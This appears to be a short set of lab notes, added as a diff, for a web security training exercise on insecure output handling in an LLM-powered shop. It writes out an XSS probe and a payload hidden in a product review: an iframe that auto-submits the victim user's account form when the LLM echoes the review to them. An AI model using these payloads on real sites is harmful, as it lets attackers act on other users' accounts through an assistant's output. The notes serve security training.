@@ -1,0 +1,7 @@
+Lab: Exploiting insecure output handling in LLMs
+
+Analysis:
+(1) Log in to your account
+(2) Submit the string <img src=1 onerror=alert(1)> to the LLM -> XSS present
+(3) Submit payload "This is nice product "<iframe src =my-account onload = this.contentDocument.forms[1].submit() >" asasd. It's so cool."
+(4) Wait for carlos to ask about jacket.
